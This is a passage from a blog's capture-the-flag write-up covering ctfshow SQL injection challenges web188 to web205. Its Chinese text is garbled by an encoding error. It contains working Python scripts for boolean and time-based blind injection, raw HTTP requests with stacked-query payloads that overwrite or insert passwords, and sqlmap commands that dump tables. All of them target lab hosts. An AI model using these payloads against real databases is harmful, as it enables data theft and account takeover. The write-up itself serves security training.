ä¸ºæ•°æ®åº“è¿›è¡Œäº†å¼±æ¯”è¾ƒï¼Œå®ƒselectå‡ºæ‰€æœ‰nameæ˜¯ä»¥å­—æ¯ä¸ºå¼€å¤´çš„æ•°æ®<br>ä»¥å­—æ¯ä¸ºå¼€å¤´çš„å­—ç¬¦å‹æ•°æ®åœ¨ä¸æ•°å­—å‹æ¯”è¾ƒæ—¶ï¼Œä¼šå¼ºåˆ¶è½¬åŒ–ä¸º0ï¼Œå†ä¸æ•°å­—æ¯”è¾ƒï¼ˆè¿™é‡Œå¾ˆç±»ä¼¼äºPHPçš„å¼±æ¯”è¾ƒï¼‰<br>å‡è®¾æˆ‘ä»¬usernameä¸º0ï¼Œé‚£ä¹ˆå°±ä¼šç›¸ç­‰ï¼Œä»è€ŒåŒ¹é…æˆåŠŸ</p><h4><span id="web189">web189</span></h4><p><a href="https://www.cnblogs.com/blacksunny/p/8060028.html"><code>load_file</code>ç»“åˆ<code>regexp</code>ç›²æ³¨</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : Yn8rt</span></span><br><span class="line"><span class="comment"># @Time    : 2021/7/30 15:48</span></span><br><span class="line"><span class="comment"># @Function:</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://6ef6bc21-0110-4f40-bb9e-d260d53faac1.challenge.ctf.show:8080/api/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">letter = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;&#123;&#125;&#x27;),0,1)&quot;</span>.<span class="built_in">format</span>(flag + j),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url,data=payload)</span><br><span class="line">        <span class="comment">#print(r)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;å¯†ç é”™è¯¯&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="web190">web190</span></h4><ul><li><p>æ—¶é—´ç›²æ³¨</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Kradress</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://cd828d70-8321-49a4-b845-f407fa23f67f.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#çˆ†å­—æ®µå€¼</span></span><br><span class="line">payload = <span class="string">&quot;select f1ag from `ctfshow_fl0g`&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment"># ä¸­é—´æŒ‡é’ˆç­‰äºå¤´å°¾æŒ‡é’ˆç›¸åŠ çš„ä¸€åŠ</span></span><br><span class="line">        <span class="comment"># print(mid)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> : <span class="string">f&quot;admin&#x27; and if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(3),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> : <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data, timeout=<span class="number">0.8</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span> <span class="comment">#sleepå¯¼è‡´è¶…æ—¶</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  è„šæœ¬è·‘å‡ºæ¥å¯èƒ½ä¼šé”™ï¼Œè¦å¤šè·‘å‡ æ¬¡å¯¹æ¯”ä¸€ä¸‹</p><h4><span id="web191">web191</span></h4><p>  æŠŠä¸Šé¢˜çš„asciiæ¢æˆord</p><h4><span id="web192">web192</span></h4>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/5/26 09:51</span></span><br><span class="line"><span class="string">    @Describe </span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># @Author:Kradress</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2296ab53-69f2-42c9-844d-28848bc82366.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†è¡¨å</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line"><span class="comment"># çˆ†åˆ—å</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span></span><br><span class="line"><span class="comment"># çˆ†å­—æ®µå€¼</span></span><br><span class="line">payload = <span class="string">&quot;select f1ag from `ctfshow_fl0g`&quot;</span></span><br><span class="line">uuid = string.ascii_lowercase + string.digits + <span class="string">&quot;&#123;-_&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> uuid:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;admin&#x27; and if(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,sleep(3),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data, timeout=<span class="number">0.8</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result += char  <span class="comment"># sleepå¯¼è‡´è¶…æ—¶</span></span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> char == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li></ul><h4><span id="web193">web193</span></h4><p>strsubä¸ç»™ç”¨äº†,midã€leiftã€rightéƒ½å¯ä»¥</p><p>right<br>ä»å³è¾¹å¼€å§‹æˆªå–,é…åˆasciiä½¿ç”¨.<br>ascii(â€˜strâ€™)è¿”å›å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç <br>ascii(right(â€˜abcâ€™,2))&#x3D; 97ç›¸å½“äº ascii(â€˜bcâ€™)&#x3D;97</p><p>left<br>ä»å·¦è¾¹å¼€å§‹æˆªå–,ç”¨reverseåè½¬</p><p>ascii(reverse(left(â€˜abcâ€™,2))) &#x3D; 97 ç›¸å½“äº ascii(â€˜bcâ€™)&#x3D;97</p><p>midå’Œstrsubæ•ˆæœä¸€æ ·,ä»£ç åŒä¸Š</p><ul><li><p>ç›´æ¥çŒœ</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/5/26 10:11</span></span><br><span class="line"><span class="string">    @Describe </span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url = <span class="string">&#x27;http://741281c8-2d94-48a5-9828-84f8186ae64d.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># likeçš„è¯ï¼Œä¸‹åˆ’çº¿æ”¾æœ€åï¼Œå› ä¸ºç›¸å½“äºæ˜¯åŒ¹é…ä»»æ„å­—ç¬¦</span></span><br><span class="line">letter = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-,&#123;&#125;_&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        <span class="comment"># çˆ†åº“å</span></span><br><span class="line">        <span class="comment"># payload = &quot;&#x27; or if((select group_concat(database())) like &#x27;&#123;&#125;&#x27;,1,0) =&#x27;1&quot;.format(flag + j + &quot;%&quot;)</span></span><br><span class="line">        <span class="comment"># çˆ†è¡¨å</span></span><br><span class="line">        <span class="comment"># payload = &quot;&#x27; or if((select group_concat(table_name) from information_schema.tables where(table_schema=database()) ) like &#x27;&#123;&#125;&#x27;,1,0) =&#x27;1&quot;.format(flag+j+&quot;%&quot;)</span></span><br><span class="line">        <span class="comment"># çˆ†å­—æ®µå</span></span><br><span class="line">        <span class="comment"># payload = &quot;&#x27; or if((select group_concat(column_name) from information_schema.columns where(table_name=&#x27;ctfshow_flxg&#x27;) ) like &#x27;&#123;&#125;&#x27;,1,0) =&#x27;1&quot;.format(flag + j + &quot;%&quot;)</span></span><br><span class="line">        <span class="comment"># çˆ†å­—æ®µ</span></span><br><span class="line">        payload = <span class="string">&quot;&#x27; or if((select group_concat(f1ag) from ctfshow_flxg) like &#x27;&#123;&#125;&#x27;,1,0) =&#x27;1&quot;</span>.<span class="built_in">format</span>(flag+j+<span class="string">&quot;%&quot;</span>)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;å¯†ç é”™è¯¯&quot;</span> == res.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h4><span id="web195">web195</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span><br><span class="line">  $sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;;&quot;;</span><br></pre></td></tr></table></figure><ul><li><p>ä½¿ç”¨updateè¯­å¥ç™»å½•ï¼Œå°†adminä½¿ç”¨hexç¼–ç (<code>$username</code>æ²¡æœ‰è¢«å•å¼•å·åŒ…è£¹)</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>33f6e930-7cb7-4763-92c1-0b8bcfd8e6d7.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>68</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://33f6e930-7cb7-4763-92c1-0b8bcfd8e6d7.challenge.ctf.show</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://33f6e930-7cb7-4763-92c1-0b8bcfd8e6d7.challenge.ctf.show/select-stacked.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-n1ql">username=0x61646d696e;<span class="keyword">update</span><span class="symbol">`ctfshow_user`</span><span class="keyword">set</span><span class="symbol">`pass`</span>=<span class="number">123</span>&amp;<span class="keyword">password</span>=<span class="number">123</span></span></span><br></pre></td></tr></table></figure></li></ul><h4><span id="web196">web196</span></h4><p><strong>å †å æ³¨å…¥</strong></p><p>é¡¾åæ€ä¹‰ï¼Œå †å æ³¨å…¥å°±æ˜¯å°†ä¸€å †sqlè¯­å¥å åŠ åœ¨ä¸€èµ·æ‰§è¡Œï¼Œä½¿ç”¨åˆ†å·ç»“æŸä¸Šä¸€ä¸ªè¯­å¥å†å åŠ å…¶ä»–è¯­å¥ä¸€èµ·æ‰§è¡Œã€‚</p><p>ç¬¬ä¸€ä¸ªè¿”å›ç©ºï¼Œç¬¬äºŒä¸ªè¿”å›1ï¼Œå¯†ç ä¹Ÿæ˜¯1ï¼Œé€»è¾‘æˆç«‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;ç™»é™†æˆåŠŸ flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>63ebcf3e-f52f-4dc2-afaf-f6e6709f904c.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>33</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://63ebcf3e-f52f-4dc2-afaf-f6e6709f904c.challenge.ctf.show</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://63ebcf3e-f52f-4dc2-afaf-f6e6709f904c.challenge.ctf.show/select-stacked.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">username</span>=<span class="number">0</span>%<span class="number">3</span>Bselect(<span class="number">2</span>)&amp;password=<span class="number">2</span></span></span><br></pre></td></tr></table></figure><h4><span id="web197">web197</span></h4><p><strong>æ’å…¥æ•°æ®</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0;insert  ctfshow_user(`username`,`pass`) value(0,0);</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h4><span id="web198">web198</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0;show tables;</span><br><span class="line">ctfshow_user</span><br></pre></td></tr></table></figure><h4><span id="web-201">web 201</span></h4><ul><li><p>å¼€å§‹ä½¿ç”¨sqlmap</p><p>æ ¹æ®æç¤ºï¼ŒåŠ ä¸Šrefer</p></li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u ba331644-ca02-<span class="number">4</span>ccf-b446-<span class="number">5</span>ad5b3629eff.challenge.ctf.show/api/?id=<span class="number">1</span> --refer=http://ba331644-ca02-<span class="number">4</span>ccf-b446-<span class="number">5</span>ad5b3629eff.challenge.ctf.show/sqlmap.php --tables</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u ba331644-ca02-<span class="number">4</span>ccf-b446-<span class="number">5</span>ad5b3629eff.challenge.ctf.show/api/?id=<span class="number">1</span> --refer=http://ba331644-ca02-<span class="number">4</span>ccf-b446-<span class="number">5</span>ad5b3629eff.challenge.ctf.show/sqlmap.php -T ctfshow_user --columns</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u ba331644-ca02-<span class="number">4</span>ccf-b446-<span class="number">5</span>ad5b3629eff.challenge.ctf.show/api/?id=<span class="number">1</span> --refer=http://ba331644-ca02-<span class="number">4</span>ccf-b446-<span class="number">5</span>ad5b3629eff.challenge.ctf.show/sqlmap.php -T ctfshow_user --columns</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u ba331644-ca02-<span class="number">4</span>ccf-b446-<span class="number">5</span>ad5b3629eff.challenge.ctf.show/api/?id=<span class="number">1</span> --refer=http://ba331644-ca02-<span class="number">4</span>ccf-b446-<span class="number">5</span>ad5b3629eff.challenge.ctf.show/sqlmap.php -T ctfshow_user -C pass --dump</span><br></pre></td></tr></table></figure><h4><span id="web202">web202</span></h4><ul><li>Sqlmap postç”¨æ³•</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://fcae001f-d669-<span class="number">430</span>c-b2ee-<span class="number">8</span>fb20fe927d2.challenge.ctf.show/api/?id=<span class="number">1</span> --data=&quot;id=<span class="number">1</span>&quot; --refer=http://fcae001f-d669-<span class="number">430</span>c-b2ee-<span class="number">8</span>fb20fe927d2.challenge.ctf.show/sqlmap.php --dbs</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u http://fcae001f-d669-<span class="number">430</span>c-b2ee-<span class="number">8</span>fb20fe927d2.challenge.ctf.show/api/?id=<span class="number">1</span> --data=&quot;id=<span class="number">1</span>&quot; --refer=http://fcae001f-d669-<span class="number">430</span>c-b2ee-<span class="number">8</span>fb20fe927d2.challenge.ctf.show/sqlmap.php --tables</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u http://fcae001f-d669-<span class="number">430</span>c-b2ee-<span class="number">8</span>fb20fe927d2.challenge.ctf.show/api/?id=<span class="number">1</span> --data=&quot;id=<span class="number">1</span>&quot; --refer=http://fcae001f-d669-<span class="number">430</span>c-b2ee-<span class="number">8</span>fb20fe927d2.challenge.ctf.show/sqlmap.php -T ctfshow_user --columns</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u http://fcae001f-d669-<span class="number">430</span>c-b2ee-<span class="number">8</span>fb20fe927d2.challenge.ctf.show/api/?id=<span class="number">1</span> --data=&quot;id=<span class="number">1</span>&quot; --refer=http://fcae001f-d669-<span class="number">430</span>c-b2ee-<span class="number">8</span>fb20fe927d2.challenge.ctf.show/sqlmap.php -T ctfshow_user -C pass --dump</span><br></pre></td></tr></table></figure><h4><span id="web203">web203</span></h4><p>è®°å¾—è¦åŠ ä¸Šâ€“headers&#x3D;â€Content-Type: text&#x2F;plainâ€ ä¸ç„¶dataæ˜¯ä»¥è¡¨å•å½¢å¼å‘é€</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">4</span>bed30ca-<span class="number">53</span>ef-<span class="number">4</span>c44-a5e1-<span class="number">91</span>eeaf63d4c0.challenge.ctf.show/api/index.php --method=PUT --headers=&quot;Content-<span class="built_in">Type</span>: text/plain&quot; --data=&quot;id=<span class="number">1</span>&quot; --refer=ctf.show --current-db --tables -T ctfshow_user --columns  -C pass -dump</span><br></pre></td></tr></table></figure><h4><span id="web-204">web 204</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py http://617aeb7f-5ecd-44a3-9040-2a7a39def7f5.challenge.ctf.show/api/index.php --method=&quot;PUT&quot; --data=&quot;id=1&quot; --refer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --cookie=&quot;PHPSESSID=p9mkuj9vngdtei0cd6efjce6pn; ctfshow=eb51da0e22ab707da3add55108b2d346&quot; -T ctfshow_user -C pass --dump</span><br></pre></td></tr></table></figure><h4><span id="web-205">web 205</span></h4><p>æŠ“åŒ…å‘ç°å…ˆè®¿é—®<code>/api/getToken.php</code>é¡µé¢ï¼ŒéªŒè¯PHPSESSIDåæ‰èƒ½é€šè¿‡ï¼Œå»è®¿é—®<code>/api/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1ã€--safe-urlï¼šæä¾›ä¸€ä¸ªå®‰å…¨ä¸é”™è¯¯çš„è¿æ¥ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´éƒ½ä¼šå»è®¿é—®ä¸€ä¸‹ã€‚</span><br><span class="line">2ã€--safe-freqï¼šæä¾›ä¸€ä¸ªå®‰å…¨ä¸é”™è¯¯çš„è¿æ¥ï¼Œæ¯æ¬¡æµ‹è¯•è¯·æ±‚ä¹‹åéƒ½ä¼šå†è®¿é—®ä¸€éå®‰å…¨è¿æ¥ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span 